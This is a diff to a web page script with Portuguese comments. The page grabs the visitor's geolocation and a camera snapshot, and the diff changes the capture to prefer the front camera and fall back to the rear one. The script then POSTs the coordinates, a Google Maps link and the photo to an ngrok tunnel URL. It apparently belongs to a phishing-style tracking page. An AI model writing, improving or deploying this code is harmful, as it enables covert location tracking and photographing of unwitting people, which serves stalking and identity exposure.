@@ -48,9 +48,13 @@
       const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
 
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        // Tentando obter a câmera frontal
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" } // Câmera frontal
+        });
+
         const video = document.createElement("video");
-        video.setAttribute("playsinline", true);
+        video.setAttribute("playsinline", true);  // Necessário para dispositivos móveis
         video.srcObject = stream;
 
         await new Promise((resolve) => {
@@ -59,7 +63,7 @@
           };
         });
 
-        // Aguarda um tempo para a câmera estabilizar (essencial em mobile)
+        // Aguarda um tempo para a câmera estabilizar
         await new Promise(resolve => setTimeout(resolve, 1500));
 
         const canvas = document.createElement("canvas");
@@ -82,6 +86,47 @@
         console.log("Localização e imagem enviados com sucesso.");
       } catch (error) {
         console.error("Erro ao capturar ou enviar dados:", error);
+
+        // Caso a câmera frontal não esteja disponível ou seja negada, tenta a traseira
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "environment" } // Câmera traseira
+          });
+
+          const video = document.createElement("video");
+          video.setAttribute("playsinline", true);  // Necessário para dispositivos móveis
+          video.srcObject = stream;
+
+          await new Promise((resolve) => {
+            video.onloadedmetadata = () => {
+              video.play().then(resolve);
+            };
+          });
+
+          // Aguarda um tempo para a câmera estabilizar
+          await new Promise(resolve => setTimeout(resolve, 1500));
+
+          const canvas = document.createElement("canvas");
+          canvas.width = 640;
+          canvas.height = 480;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const image = canvas.toDataURL("image/jpeg");
+
+          // Libera a câmera
+          stream.getTracks().forEach(track => track.stop());
+
+          // Envia os dados
+          await fetch("https://3677-177-200-138-128.ngrok-free.app/send-data", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ latitude, longitude, maps, image })
+          });
+
+          console.log("Localização e imagem enviados com sucesso.");
+        } catch (innerError) {
+          console.error("Erro ao capturar ou enviar com a câmera traseira:", innerError);
+        }
       }
     }
   </script>
